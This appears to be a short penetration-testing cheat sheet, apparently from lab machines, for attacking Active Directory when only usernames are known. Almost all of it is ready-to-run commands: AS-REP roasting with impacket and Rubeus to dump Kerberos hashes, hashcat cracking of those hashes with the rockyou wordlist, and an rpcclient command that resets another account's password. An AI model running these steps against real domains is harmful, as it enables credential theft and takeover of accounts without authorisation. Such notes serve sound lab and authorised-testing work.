## We got Users but no Pass?

### Links

- [GitHub Rubeus](https://github.com/GhostPack/Rubeus)
### ASREP Roasting Attack

```
impacket-GetNPUsers htb.local/ -usersfile user.txt -format hashcat -outputfile hashes.domain.txt

or this:

for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.192 blackfield.local/$user | grep krb5asrep; done



.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
```

```

impacket-GetNPUsers -dc-ip 192.168.205.70  -request -outputfile hashes.asreproast corp.com/pete
hashcat --help | grep -i "Kerberos"

sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

cd C:\Tools
.\Rubeus.exe asreproast /nowrap

sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```


### Password Reset over RPC

https://room362.com/posts/2017/reset-ad-user-password-with-linux/

```
Log into Rpc with the user who can change password of other user:

rpcclient $> setuserinfo2

rpcclient $> setuserinfo2 audit2020 23 'Bwiz123!!!'

```

